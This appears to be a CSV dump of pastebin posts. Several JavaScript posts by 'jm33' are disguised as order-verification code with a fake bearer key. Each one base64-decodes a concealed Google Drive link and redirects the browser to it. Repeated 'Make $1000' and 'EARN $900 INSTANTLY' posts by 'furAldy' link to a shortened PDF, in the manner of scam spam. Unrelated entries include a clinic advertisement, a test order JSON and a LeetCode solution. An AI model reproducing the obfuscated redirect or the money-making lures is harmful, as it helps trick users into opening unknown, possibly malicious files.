id,title,username,language,date,content
SYUPRjTu,Make $1000 15-MINUTES (BEGINNER) TS,furAldy,JavaScript,Monday 7th of April 2025 01:06:46 AM CDT," 
Pdf https://goo.su/DgLIPOe


2sPZT1uijZ
"
RHKRBxcZ,Market.js,jm33,JavaScript,Monday 7th of April 2025 01:01:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/02401/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TZF6tShF,EARN $900 INSTANTLY 2025 X0,furAldy,JavaScript,Monday 7th of April 2025 12:50:52 AM CDT," 
Pdf https://goo.su/DgLIPOe


r2N0Ny8PwO
"
rx5EHZQe,Untitled,jm33,JavaScript,Monday 7th of April 2025 12:46:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/31687/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
X8zeNyQs,Trusted Vein Doctors at USA Vein Clinics in the Bronx,usveinclinics,HTML,Monday 7th of April 2025 12:37:51 AM CDT,"USA Vein Clinics in the Bronx offers advanced, minimally invasive treatments for varicose and spider veins. Our experienced vein specialists provide procedures like Endovenous Laser Treatment (EVLT), Radiofrequency Ablation (RFA), and Sclerotherapy to alleviate symptoms such as leg pain, swelling, and fatigue. With multiple convenient locations throughout the Bronx, accessing top-quality vein care is straightforward. Schedule your consultation today to achieve healthier, more comfortable legs with our dedicated vein doctors in the Bronx. 
https://www.usaveinclinics.com/company/locations/new-york/bronx/"
yVmcD7Hh,Make $1000 15-MINUTES (BEGINNER) 3R,furAldy,JavaScript,Monday 7th of April 2025 12:34:55 AM CDT," 
Pdf https://goo.su/DgLIPOe


NSFF0t3B6B
"
dVVDS0Fs,Products.js,jm33,JavaScript,Monday 7th of April 2025 12:30:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10826/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1VD2AejG,ZOMATO TEST ORDER,bagsari,JSON,Monday 7th of April 2025 12:24:05 AM CDT,"{

  ""components"": [
    {
      ""inventory_id"": 185769,
      ""is_delivery"": true,
      ""quantity"": 1,
      ""unit_id"": 48
    }
  ],
  ""user"": {
    ""email"": ""raj@example.com""

  },
  ""payment_mode"": ""Cash"",
  ""currency"": ""INR"",
  ""added_on"": ""2025-04-07T05:19:15.453Z"",
  ""info"": {""source"": ""ZOMATO""},
  ""is_paid"": false,
  ""update"": false,
  ""source_order_id"": ""ZOMATO-12345"",
  ""status"": ""Created""
}"
5MJhUb56,EARN $900 INSTANTLY 2025 Z1,furAldy,JavaScript,Monday 7th of April 2025 12:18:59 AM CDT," 
Pdf https://goo.su/DgLIPOe


xyc4gae3Eu
"
BaPKGT94,Untitled,smj007,Python,Monday 7th of April 2025 12:15:46 AM CDT,"# same tc and sc for both - however - 

class Solution:
    def maxProfit(self, prices: List[int]) -> int:
        max_profit = 0
        recent_valley = prices[0]
        recent_peak = prices[0]
        i = 0

        while i < len(prices)-1:
            #find valley first
            while i < len(prices)-1 and prices[i+1]<=prices[i]:
                i += 1
            recent_valley = prices[i]
           
            # find peak then
            while i < len(prices)-1 and prices[i+1]>=prices[i]:
                i += 1
            recent_peak = prices[i]

            # calculate profit
            max_profit += recent_peak - recent_valley

        return max_profit


class Solution:
    def maxProfit(self, prices: List[int]) -> int:
        max_profit = 0

        for i in range(1, len(prices)):
            if prices[i] > prices[i-1]:
                max_profit += prices[i] - prices[i-1]

        return max_profit
        "
7ApGN4FG,Order.js,jm33,JavaScript,Monday 7th of April 2025 12:15:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55870/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
